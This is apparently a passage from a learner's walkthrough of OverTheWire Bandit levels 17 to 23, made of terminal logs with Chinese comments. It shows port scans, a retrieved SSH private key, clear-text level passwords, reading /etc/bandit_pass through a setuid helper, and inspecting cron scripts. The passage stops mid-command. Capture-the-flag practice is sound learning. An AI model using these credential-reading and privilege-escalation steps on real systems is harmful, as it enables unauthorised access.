JQttfApK4SeyHwDlI9SXGR50qclOAil1 closed level17 bandit16@bandit:~$ nmap -sV localhost -T5 -p 31000-32000 Starting Nmap 7.80 ( https://nmap.org ) at 2023-07-17 04:20 UTC Nmap scan report for localhost (127.0.0.1) Host is up (0.00015s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 31046/tcp open echo 31518/tcp open ssl/echo 31691/tcp open echo 31790/tcp open ssl/unknown 31960/tcp open echo 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port31790-TCP:V=7.80%T=SSL%I=7%D=7/17%Time=64B4C185%P=x86_64-pc-linux-g SF:nu%r(GenericLines,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20cu SF:rrent\\x20password\\n\")%r(GetRequest,31,\"Wrong!\\x20Please\\x20enter\\x20the SF:\\x20correct\\x20current\\x20password\\n\")%r(HTTPOptions,31,\"Wrong!\\x20Plea SF:se\\x20enter\\x20the\\x20correct\\x20current\\x20password\\n\")%r(RTSPRequest, SF:31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\x20password\\ SF:n\")%r(Help,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\x SF:20password\\n\")%r(SSLSessionReq,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20 SF:correct\\x20current\\x20password\\n\")%r(TerminalServerCookie,31,\"Wrong!\\x2 SF:0Please\\x20enter\\x20the\\x20correct\\x20current\\x20password\\n\")%r(TLSSess SF:ionReq,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\x20pa SF:ssword\\n\")%r(Kerberos,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x SF:20current\\x20password\\n\")%r(FourOhFourRequest,31,\"Wrong!\\x20Please\\x20e SF:nter\\x20the\\x20correct\\x20current\\x20password\\n\")%r(LPDString,31,\"Wrong SF:!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\x20password\\n\")%r(LDA SF:PSearchReq,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\x SF:20password\\n\")%r(SIPOptions,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20cor SF:rect\\x20current\\x20password\\n\"); Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 98.85 seconds \u7136\u540e\uff0c\u8981\u8f93\u516516\u7684\u5bc6\u7801 bandit16@bandit:~$ openssl s_client -connect localhost:31790 -ign_eof CONNECTED(00000003) Can't use SSL_get_servername depth=0 CN = localhost verify error:num=18:self-signed certificate verify return:1 depth=0 CN = localhost verify error:num=10:certificate has expired notAfter=Jul 17 03:32:59 2023 GMT verify return:1 depth=0 CN = localhost notAfter=Jul 17 03:32:59 2023 GMT verify return:1 --- Certificate chain 0 s:CN = localhost i:CN = localhost a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA1 v:NotBefore: Jul 17 03:31:59 2023 GMT; NotAfter: Jul 17 03:32:59 2023 GMT --- Server certificate -----BEGIN CERTIFICATE----- MIIDCzCCAfOgAwIBAgIEasML0jANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDDAls b2NhbGhvc3QwHhcNMjMwNzE3MDMzMTU5WhcNMjMwNzE3MDMzMjU5WjAUMRIwEAYD VQQDDAlsb2NhbGhvc3QwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDQ WpK5aICLya01rGDXaLVwQpZqWmn75BPH3O2vrqMAu14iXbKtemseBnOaB3vSfu04 QNfWLYWKrnab4hd73/TOurIHq33MnsH8Yb+lzx6VfBq/FouTviT2QBE5cVlvQV63 QPjJZ4mBomudPpDXLfbHWxsH8BYxa6lSqBjs8EqOnfEL9SRoQ+H0w66NjpOnGtLO l0oYAbmriOkmOht1tr1hoxiacNZa9WEOq01SNrIRGbhOPw07c7/rVXfz9dDBrhPQ D7FpX/UDyZvJFM3I+sTpwoUj7Ypzvhim+kVY9lGRnzuy439yGovgURCiNwlXUpDA /Kr/hRCriC3URJT4mWKdAgMBAAGjZTBjMBQGA1UdEQQNMAuCCWxvY2FsaG9zdDBL BglghkgBhvhCAQ0EPhY8QXV0b21hdGljYWxseSBnZW5lcmF0ZWQgYnkgTmNhdC4g U2VlIGh0dHBzOi8vbm1hcC5vcmcvbmNhdC8uMA0GCSqGSIb3DQEBBQUAA4IBAQBy qV/aRIcHHbKSksYqANDBrkLgfXKXKeXMZBTBq3Q4rMLF/ux7tGU+2/YPAo/6L0IZ 2/UGcW+/msmgvBE3+j5FnIB/aoqp2M8fksOiaC8OrsJ6bbShEEV+q5VITosF/Nw0 qrpoXa+7l5IF/8tuTCpi4ZQGHX+uoRgufcGkK3c8Gxsb9Xtroz8se7yLU0VKLm4d /H0Ozu4QkVTaQ+7971pXYHyip3tKuJbCeJOJledvqGvvcaIvE9S1vxEugQUq2K6u DZfCLU3TR9l29QonH13HtF5mEDNE4KaMtYxM4B4Mo3KMUHVf4hi4nKJVpjs/FSiI Vpv3P9pqfmYjEQjp7yIz -----END CERTIFICATE----- subject=CN = localhost issuer=CN = localhost --- No client certificate CA names sent Peer signing digest: SHA256 Peer signature type: RSA-PSS Server Temp Key: X25519, 253 bits --- SSL handshake has read 1339 bytes and written 373 bytes Verification error: certificate has expired --- New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384 Server public key is 2048 bit Secure Renegotiation IS NOT supported Compression: NONE Expansion: NONE No ALPN negotiated Early data was not sent Verify return code: 10 (certificate has expired) --- --- Post-Handshake New Session Ticket arrived: SSL-Session: Protocol : TLSv1.3 Cipher : TLS_AES_256_GCM_SHA384 Session-ID: AD5693D41623D8997CC2EE94B1CC7C61F949EFBC34B80DC8421E8B82C6572B65 Session-ID-ctx: Resumption PSK: AFE5847E9831517B3B0BCF4B511501803A902004393C9D3D926CA22524CCE716B6A771D7802C706EF3C94E8C264D4B95 PSK identity: None PSK identity hint: None SRP username: None TLS session ticket lifetime hint: 7200 (seconds) TLS session ticket: 0000 - a5 d8 4b ca c0 ad 23 28-64 e1 24 b6 18 97 bf 19 ..K...#(d.$..... 0010 - c4 53 bd cd 78 c9 dd 28-f5 14 4c 9d 30 a0 18 97 .S..x..(..L.0... 0020 - 5d d6 5b 92 2f 96 7a 0e-ac e2 49 bc e3 d1 a6 79 ].[./.z...I....y 0030 - 73 37 ea 00 c4 4f 0a 07-4c 4e b9 f8 f4 fe 04 bd s7...O..LN...... 0040 - cb a9 f5 31 28 a1 b9 07-fd cb 83 8b 8d 93 b8 7f ...1(........... 0050 - 51 10 1a b9 7c 4e 10 ab-4b 93 8c c7 88 9f 6e 85 Q...|N..K.....n. 0060 - 87 e8 fc bc 3d f7 93 f0-2f 55 1d cf 64 80 7c 08 ....=.../U..d.|. 0070 - f2 1c 95 b9 d1 3f 15 90-57 e1 b1 9e 93 87 1d 72 .....?..W......r 0080 - 93 ed 83 b8 4b ef d2 bd-1d f5 ca 1b f9 d6 7a ff ....K.........z. 0090 - 13 fd 8f 40 43 fe 97 99-2a fa eb f9 52 ad b0 27 ...@C...*...R..' 00a0 - be 2a a0 5c a7 fd 76 6a-22 58 a4 56 02 e7 f2 13 .*.\\..vj\"X.V.... 00b0 - 4b 01 58 44 ab 63 3d 3d-fa 7e f7 ac 66 8c ef da K.XD.c==.~..f... 00c0 - 79 db d0 58 9f c1 fe 8c-3f 95 19 ed a6 f6 08 e8 y..X....?....... Start Time: 1689568148 Timeout : 7200 (sec) Verify return code: 10 (certificate has expired) Extended master secret: no Max Early Data: 0 --- read R BLOCK --- Post-Handshake New Session Ticket arrived: SSL-Session: Protocol : TLSv1.3 Cipher : TLS_AES_256_GCM_SHA384 Session-ID: 731D8DE5B4509BB39289FED6CED817A731462808EFAF8C604A5BEE6E85CD12AB Session-ID-ctx: Resumption PSK: F18769CA70C1B23B9CAFAD3D8682E406B83AF8FC439A378D79ABBB19CD4B59EE837D9121AB1BA7FCCF1F761FA4AFB8F7 PSK identity: None PSK identity hint: None SRP username: None TLS session ticket lifetime hint: 7200 (seconds) TLS session ticket: 0000 - a5 d8 4b ca c0 ad 23 28-64 e1 24 b6 18 97 bf 19 ..K...#(d.$..... 0010 - 23 10 a4 f3 c5 e4 25 65-c5 73 a7 ce d3 1b 98 bf #.....%e.s...... 0020 - 1a 41 ff b2 2e 44 0f c6-a2 7c a6 12 0c 22 7a a9 .A...D...|...\"z. 0030 - 28 d6 09 17 d2 7a 97 5b-a3 37 fc 5c de 86 24 47 (....z.[.7.\\..$G 0040 - 78 20 db 23 15 d1 3d 77-19 b2 91 dc c7 43 d6 66 x .#..=w.....C.f 0050 - 3c 04 a7 dd b9 32 e6 0f-16 a1 ab dd 92 99 18 e7 <....2.......... 0060 - 23 ad ab 79 3e af 2d ca-ea 4e 29 67 27 39 d2 d4 #..y>.-..N)g'9.. 0070 - e9 6f e0 5b be 0d d4 2d-07 e2 83 10 4a aa 94 20 .o.[...-....J.. 0080 - 1e 06 3d 42 df 74 91 99-43 cc bc ca 5c 59 74 f1 ..=B.t..C...\\Yt. 0090 - df 00 c4 16 44 2d a1 0f-db db 65 84 3b 89 58 b4 ....D-....e.;.X. 00a0 - 81 71 91 ec 5c 5e a3 db-51 25 b4 37 e5 0d 6b 41 .q..\\^..Q%.7..kA 00b0 - 88 a8 dc 9d b3 02 5b 68-04 4c 01 cd cd a3 17 24 ......[h.L.....$ 00c0 - 4a fe f5 03 49 ab 60 1e-b3 eb 07 04 92 c5 ff ab J...I.`......... Start Time: 1689568148 Timeout : 7200 (sec) Verify return code: 10 (certificate has expired) Extended master secret: no Max Early Data: 0 --- read R BLOCK Wrong! Please enter the correct current password closed \u662f\u4ece\u8fd9\u91cc\u770b\u51fa\u6765\u8981\u8f93\u5165\u5bc6\u7801\u7684\uff01 bandit16@bandit:~$ openssl s_client -connect localhost:31790 -ign_eof CONNECTED(00000003) Can't use SSL_get_servername depth=0 CN = localhost verify error:num=18:self-signed certificate verify return:1 depth=0 CN = localhost verify error:num=10:certificate has expired notAfter=Jul 17 03:32:59 2023 GMT verify return:1 depth=0 CN = localhost notAfter=Jul 17 03:32:59 2023 GMT verify return:1 --- Certificate chain 0 s:CN = localhost i:CN = localhost a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA1 v:NotBefore: Jul 17 03:31:59 2023 GMT; NotAfter: Jul 17 03:32:59 2023 GMT --- Server certificate -----BEGIN CERTIFICATE----- MIIDCzCCAfOgAwIBAgIEasML0jANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDDAls b2NhbGhvc3QwHhcNMjMwNzE3MDMzMTU5WhcNMjMwNzE3MDMzMjU5WjAUMRIwEAYD VQQDDAlsb2NhbGhvc3QwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDQ WpK5aICLya01rGDXaLVwQpZqWmn75BPH3O2vrqMAu14iXbKtemseBnOaB3vSfu04 QNfWLYWKrnab4hd73/TOurIHq33MnsH8Yb+lzx6VfBq/FouTviT2QBE5cVlvQV63 QPjJZ4mBomudPpDXLfbHWxsH8BYxa6lSqBjs8EqOnfEL9SRoQ+H0w66NjpOnGtLO l0oYAbmriOkmOht1tr1hoxiacNZa9WEOq01SNrIRGbhOPw07c7/rVXfz9dDBrhPQ D7FpX/UDyZvJFM3I+sTpwoUj7Ypzvhim+kVY9lGRnzuy439yGovgURCiNwlXUpDA /Kr/hRCriC3URJT4mWKdAgMBAAGjZTBjMBQGA1UdEQQNMAuCCWxvY2FsaG9zdDBL BglghkgBhvhCAQ0EPhY8QXV0b21hdGljYWxseSBnZW5lcmF0ZWQgYnkgTmNhdC4g U2VlIGh0dHBzOi8vbm1hcC5vcmcvbmNhdC8uMA0GCSqGSIb3DQEBBQUAA4IBAQBy qV/aRIcHHbKSksYqANDBrkLgfXKXKeXMZBTBq3Q4rMLF/ux7tGU+2/YPAo/6L0IZ 2/UGcW+/msmgvBE3+j5FnIB/aoqp2M8fksOiaC8OrsJ6bbShEEV+q5VITosF/Nw0 qrpoXa+7l5IF/8tuTCpi4ZQGHX+uoRgufcGkK3c8Gxsb9Xtroz8se7yLU0VKLm4d /H0Ozu4QkVTaQ+7971pXYHyip3tKuJbCeJOJledvqGvvcaIvE9S1vxEugQUq2K6u DZfCLU3TR9l29QonH13HtF5mEDNE4KaMtYxM4B4Mo3KMUHVf4hi4nKJVpjs/FSiI Vpv3P9pqfmYjEQjp7yIz -----END CERTIFICATE----- subject=CN = localhost issuer=CN = localhost --- No client certificate CA names sent Peer signing digest: SHA256 Peer signature type: RSA-PSS Server Temp Key: X25519, 253 bits --- SSL handshake has read 1339 bytes and written 373 bytes Verification error: certificate has expired --- New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384 Server public key is 2048 bit Secure Renegotiation IS NOT supported Compression: NONE Expansion: NONE No ALPN negotiated Early data was not sent Verify return code: 10 (certificate has expired) --- --- Post-Handshake New Session Ticket arrived: SSL-Session: Protocol : TLSv1.3 Cipher : TLS_AES_256_GCM_SHA384 Session-ID: 1B8DD2D7E7B861C8494FB2E901FEB50552571BFE7200C45C57EEACE66795AEEA Session-ID-ctx: Resumption PSK: 25F7290250EB5F41F5C184E597BD8493DFD4EC4E8965B10CE6A409D2909B370F30DB9A1E965F680CCD6F9C9E3BC4D0C6 PSK identity: None PSK identity hint: None SRP username: None TLS session ticket lifetime hint: 7200 (seconds) TLS session ticket: 0000 - a5 d8 4b ca c0 ad 23 28-64 e1 24 b6 18 97 bf 19 ..K...#(d.$..... 0010 - a1 6b 8c 90 89 4b 8b e8-df 1e 82 05 28 ad a8 5f .k...K......(.._ 0020 - 65 f3 03 76 14 8f d5 97-8a a5 28 ea 20 2f 06 55 e..v......(. /.U 0030 - 16 ba 4b 88 de ab 7e 00-1c 76 ba 08 b1 e7 0f a9 ..K...~..v...... 0040 - 1d 53 2a 31 16 6b 02 0d-2e dd e7 9a f4 9a e8 13 .S*1.k.......... 0050 - 13 a1 20 67 4c 24 07 53-18 c1 68 56 30 f4 92 c3 .. gL$.S..hV0... 0060 - b5 5b a6 4d 99 ff 16 fd-30 72 9b 0e f7 f2 c6 ab .[.M....0r...... 0070 - 69 c1 c0 b9 16 18 3d 5c-c4 db 4f b9 06 bf 6c 6f i.....=\\..O...lo 0080 - 51 c4 99 60 fa 03 55 af-ad 46 ed e1 53 0f 92 65 Q..`..U..F..S..e 0090 - 57 82 b9 5b ce 5b 40 37-4f d5 a8 a3 27 63 b9 2d W..[.[@7O...'c.- 00a0 - 6b e4 ea 11 f2 9f c3 f7-82 3d 16 4e 2b 40 d3 25 k........=.N+@.% 00b0 - 50 10 0f aa 74 30 49 da-c8 01 32 23 c0 b7 3c 8b P...t0I...2#..<. 00c0 - 97 8d 24 10 2d 93 73 04-33 01 d9 70 92 26 4e fc ..$.-.s.3..p.&N. Start Time: 1689568162 Timeout : 7200 (sec) Verify return code: 10 (certificate has expired) Extended master secret: no Max Early Data: 0 --- read R BLOCK --- Post-Handshake New Session Ticket arrived: SSL-Session: Protocol : TLSv1.3 Cipher : TLS_AES_256_GCM_SHA384 Session-ID: A0EF32E17C1AC0960FD46EE50181836B83644B2168CDC3087A3612EC77D9A111 Session-ID-ctx: Resumption PSK: 117786B647299C2A691BD342EDC8E39A7899490BE868D804415203AED03876A67C51CE8E55D236DAC96130391C36759A PSK identity: None PSK identity hint: None SRP username: None TLS session ticket lifetime hint: 7200 (seconds) TLS session ticket: 0000 - a5 d8 4b ca c0 ad 23 28-64 e1 24 b6 18 97 bf 19 ..K...#(d.$..... 0010 - f3 b6 fd 9d 6e e3 35 98-ad 1d df 9e 75 38 c5 47 ....n.5.....u8.G 0020 - 15 7a c4 8f 31 3b 39 1e-ef 1c f2 56 f2 61 48 a9 .z..1;9....V.aH. 0030 - 36 ae 3d 66 e9 0d 0f ff-07 39 33 77 d7 87 8c 63 6.=f.....93w...c 0040 - fb 00 ab 1e 27 3a 91 ed-24 49 b6 e2 9d 49 a6 2b ....':..$I...I.+ 0050 - 90 ce a6 8b ea 1c bd f5-38 77 83 fc 9b 4c b4 49 ........8w...L.I 0060 - 3b d9 7c bb 52 0b 2d 38-88 a5 80 b0 8e 80 5d 66 ;.|.R.-8......]f 0070 - 1e 0b 9d 10 b2 81 11 51-0a 30 60 ec b9 2d d2 5e .......Q.0`..-.^ 0080 - 64 66 87 44 84 78 f8 e5-2b 62 cb 5f 84 aa 50 01 df.D.x..+b._..P. 0090 - 5d d6 62 fd e8 8b f8 fc-91 0c 8a f9 a7 12 6e ae ].b...........n. 00a0 - b9 40 f2 4f 90 01 0e 30-cf bf 16 3a b5 96 fc 3a .@.O...0...:...: 00b0 - 9b a5 e0 4a 54 df eb 39-68 be 05 77 6b 50 d7 a3 ...JT..9h..wkP.. 00c0 - 87 0e 7d bf 33 1a 9e 31-40 b6 3e 5e 1f a9 cf d6 ..}.3..1@.>^.... Start Time: 1689568162 Timeout : 7200 (sec) Verify return code: 10 (certificate has expired) Extended master secret: no Max Early Data: 0 --- read R BLOCK JQttfApK4SeyHwDlI9SXGR50qclOAil1 Correct! -----BEGIN RSA PRIVATE KEY----- MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama +TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT 8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM 77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3 vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY= -----END RSA PRIVATE KEY----- closed \u8fd4\u56de\u4e86\u6b63\u786e\u7684\u5bc6\u94a5\uff0c\u7136\u540e\u5199\u5165/tmp\u4e0b\u7684\u67d0\u4e2a\u6587\u4ef6\uff0c\u7136\u540e\u7ed9\u5b83\u53ea\u6709\u81ea\u5df1\u53ef\u8bfb\u53ef\u5199\u5373\u53ef # \u9996\u5148\u9700\u8981\u5728tmp\u4e0b\u65b0\u5efa\u4e00\u4e2a\u6587\u4ef6\u5939\uff0c\u7136\u540e\u628a\u5bc6\u94a5\u5199\u8fdb\u53bb\uff0c\u7136\u540echmod 666\u90a3\u4e2a\u6587\u4ef6 bandit16@bandit:/tmp/a$ ssh -i 1.private bandit17@localhost -p 2220 --[ More information ]-- For more information regarding individual wargames, visit http://www.overthewire.org/wargames/ For support, questions or comments, contact us on discord or IRC. Enjoy your stay! bandit17@bandit:~$ level18 \u76f4\u63a5diff bandit17@bandit:~$ diff passwords.old passwords.new 42c42 < glZreTEH1V3cGKL6g4conYqZqaEj0mte --- > hga5tuuCLF6fFzUpnagiMN8ssu9LFrdg bandit17@bandit:~$ \u7136\u540e\u767b\u5f55\uff0c\u7136\u540e\u5c31\u662f\uff1a \u250c\u2500[myc@ubuntu22]\u2500[~] \u2514\u2500\u2500\u257c[13:02:46]$ ssh bandit18@bandit.labs.overthewire.org -p 2220 _ _ _ _ | |__ __ _ _ __ __| (_) |_ | '_ \\ / _` | '_ \\ / _` | | __| | |_) | (_| | | | | (_| | | |_ |_.__/ \\__,_|_| |_|\\__,_|_|\\__| This is an OverTheWire game server. More information on http://www.overthewire.org/wargames bandit18@bandit.labs.overthewire.org's password: ,----.. ,----, .---. / / \\ ,/ .`| /. ./| / . : ,` .' : .--'. ' ; . / ;. \\ ; ; / /__./ \\ : | . ; / ` ; .'___,/ ,' .--'. ' \\' . ; | ; \\ ; | | : | /___/ \\ | ' ' | : | ; | ' ; |.'; ; ; \\ \\; : . | ' ' ' : `----' | | \\ ; ` | ' ; \\; / | ' : ; . \\ .\\ ; \\ \\ ', / | | ' \\ \\ ' \\ | ; : / ' : | : ' |--\" \\ \\ .' ; |.' \\ \\ ; www. `---` ver '---' he '---\" ire.org Welcome to OverTheWire! If you find any problems, please report them to the #wargames channel on discord or IRC. --[ Playing the games ]-- This machine might hold several wargames. If you are playing \"somegame\", then: * USERNAMES are somegame0, somegame1, ... * Most LEVELS are stored in /somegame/. * PASSWORDS for each level are stored in /etc/somegame_pass/. Write-access to homedirectories is disabled. It is advised to create a working directory with a hard-to-guess name in /tmp/. You can use the command \"mktemp -d\" in order to generate a random and hard to guess directory in /tmp/. Read-access to both /tmp/ is disabled and to /proc restricted so that users cannot snoop on eachother. Files and directories with easily guessable or short names will be periodically deleted! The /tmp directory is regularly wiped. Please play nice: * don't leave orphan processes running * don't leave exploit-files laying around * don't annoy other players * don't post passwords or spoilers * again, DONT POST SPOILERS! This includes writeups of your solution on your blog or website! --[ Tips ]-- This machine has a 64bit processor and many security-features enabled by default, although ASLR has been switched off. The following compiler flags might be interesting: -m32 compile for 32bit -fno-stack-protector disable ProPolice -Wl,-z,norelro disable relro In addition, the execstack tool can be used to flag the stack as executable on ELF binaries. Finally, network-access is limited for most levels by a local firewall. --[ Tools ]-- For your convenience we have installed a few useful tools which you can find in the following locations: * gef (https://github.com/hugsy/gef) in /opt/gef/ * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/ * peda (https://github.com/longld/peda.git) in /opt/peda/ * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/ * pwntools (https://github.com/Gallopsled/pwntools) * radare2 (http://www.radare.org/) Both python2 and python3 are installed. --[ More information ]-- For more information regarding individual wargames, visit http://www.overthewire.org/wargames/ For support, questions or comments, contact us on discord or IRC. Enjoy your stay! Byebye ! Connection to bandit.labs.overthewire.org closed. level19 \u8fd9\u4e2a\uff0c\u544a\u8bc9\u4e86\u4f60\u6587\u4ef6\u540d\u548c\u4f4d\u7f6e\uff0c\u53ef\u4ee5\u76f4\u63a5\u8bfb\uff0c\u800c\u4e0d\u662f\u94fe\u63a5\u4e00\u4e2abash \u56e0\u6b64\u53ef\u4ee5\u73a9\u513f\u4e00\u4e2a\u9a9a\u64cd\u4f5c \u250c\u2500[Fail][myc@ubuntu22]\u2500[~] \u2514\u2500\u2500\u257c[13:09:29]$ ssh bandit18@bandit.labs.overthewire.org -p 2220 -t cat readme _ _ _ _ | |__ __ _ _ __ __| (_) |_ | '_ \\ / _` | '_ \\ / _` | | __| | |_) | (_| | | | | (_| | | |_ |_.__/ \\__,_|_| |_|\\__,_|_|\\__| This is an OverTheWire game server. More information on http://www.overthewire.org/wargames bandit18@bandit.labs.overthewire.org's password: awhqfNnAbc1naukrpqDYcF95h7HoMTrC Connection to bandit.labs.overthewire.org closed. level20 \u5c31\u662f\u8fd0\u884c\u8fd9\u4e2a\u5c0f\u6587\u4ef6 bandit19@bandit:~$ ./bandit20-do --help Usage: env [OPTION]... [-] [NAME=VALUE]... [COMMAND [ARG]...] Set each NAME to VALUE in the environment and run COMMAND. Mandatory arguments to long options are mandatory for short options too. -i, --ignore-environment start with an empty environment -0, --null end each output line with NUL, not newline -u, --unset=NAME remove variable from the environment -C, --chdir=DIR change working directory to DIR -S, --split-string=S process and split S into separate arguments; used to pass multiple arguments on shebang lines --block-signal[=SIG] block delivery of SIG signal(s) to COMMAND --default-signal[=SIG] reset handling of SIG signal(s) to the default --ignore-signal[=SIG] set handling of SIG signals(s) to do nothing --list-signal-handling list non default signal handling to stderr -v, --debug print verbose information for each processing step --help display this help and exit --version output version information and exit A mere - implies -i. If no COMMAND, print the resulting environment. SIG may be a signal name like 'PIPE', or a signal number like '13'. Without SIG, all known signals are included. Multiple signals can be comma-separated. GNU coreutils online help: <https://www.gnu.org/software/coreutils/> Full documentation <https://www.gnu.org/software/coreutils/env> or available locally via: info '(coreutils) env invocation' bandit19@bandit:~$ ./bandit20-do NAME=11020 cat /etc/bandit_pass/bandit20 VxCazJaVykI6W36BkBU0mJTCM8rR95XT bandit19@bandit:~$ level21 \u76f4\u63a5\u770b\u56fe NvEJF7oVjkddltPSrdKEFOllh9V1IBcq level22 \u5c31\u662f\u770b\u5b88\u62a4\u8fdb\u7a0b\u5728\u8fd0\u884c\u54ea\u4e2a\u811a\u672c\uff0c\u7136\u540e\u8ddf\u7740\u53bb\u627e\u3002 bandit21@bandit:~$ man cron bandit21@bandit:~$ man crontab bandit21@bandit:~$ man 5 crontab bandit21@bandit:~$ cd /etc/cron.d/ bandit21@bandit:/etc/cron.d$ ll total 56 drwxr-xr-x 2 root root 4096 Apr 23 18:05 ./ drwxr-xr-x 108 root root 12288 Jun 10 22:51 ../ -rw-r--r-- 1 root root 62 Apr 23 18:04 cronjob_bandit15_root -rw-r--r-- 1 root root 62 Apr 23 18:04 cronjob_bandit17_root -rw-r--r-- 1 root root 120 Apr 23 18:04 cronjob_bandit22 -rw-r--r-- 1 root root 122 Apr 23 18:04 cronjob_bandit23 -rw-r--r-- 1 root root 120 Apr 23 18:04 cronjob_bandit24 -rw-r--r-- 1 root root 62 Apr 23 18:04 cronjob_bandit25_root -rw-r--r-- 1 root root 201 Jan 8 2022 e2scrub_all -rwx------ 1 root root 52 Apr 23 18:05 otw-tmp-dir* -rw-r--r-- 1 root root 102 Mar 23 2022 .placeholder -rw-r--r-- 1 root root 396 Feb 2 2021 sysstat bandit21@bandit:/etc/cron.d$ cat cronjob_bandit15_root * * * * * root /usr/bin/cronjob_bandit15_root.sh &> /dev/null bandit21@bandit:/etc/cron.d$ cat cronjob_bandit17_root * * * * * root /usr/bin/cronjob_bandit17_root.sh &> /dev/null bandit21@bandit:/etc/cron.d$ cat cronjob_bandit22 @reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null * * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null bandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh #!/bin/bash chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv bandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff bandit21@bandit:/etc/cron.d$ level23 \u548c\u4e0a\u9762\u90a3\u4e2a\u9898\u51e0\u4e4e\u4e00\u6837 bandit22@bandit:~$ cd /etc/cron.d/ bandit22@bandit:/etc/cron.d$ ll total 56 drwxr-xr-x 2 root root 4096 Apr 23 18:05 ./ drwxr-xr-x 108 root root 12288 Jun 10 22:51 ../ -rw-r--r-- 1 root root 62 Apr 23 18:04 cronjob_bandit15_root -rw-r--r-- 1 root root 62 Apr 23 18:04 cronjob_bandit17_root -rw-r--r-- 1 root root 120 Apr 23 18:04 cronjob_bandit22 -rw-r--r-- 1 root root 122 Apr 23 18:04 cronjob_bandit23 -rw-r--r-- 1 root root 120 Apr 23 18:04 cronjob_bandit24 -rw-r--r-- 1 root root 62 Apr 23 18:04 cronjob_bandit25_root -rw-r--r-- 1 root root 201 Jan 8 2022 e2scrub_all -rwx------ 1 root root 52 Apr 23 18:05 otw-tmp-dir* -rw-r--r-- 1 root root 102 Mar 23 2022 .placeholder -rw-r--r-- 1 root root 396 Feb 2 2021 sysstat bandit22@bandit:/etc/cron.d$ cat cronjob_bandit23 @reboot bandit23 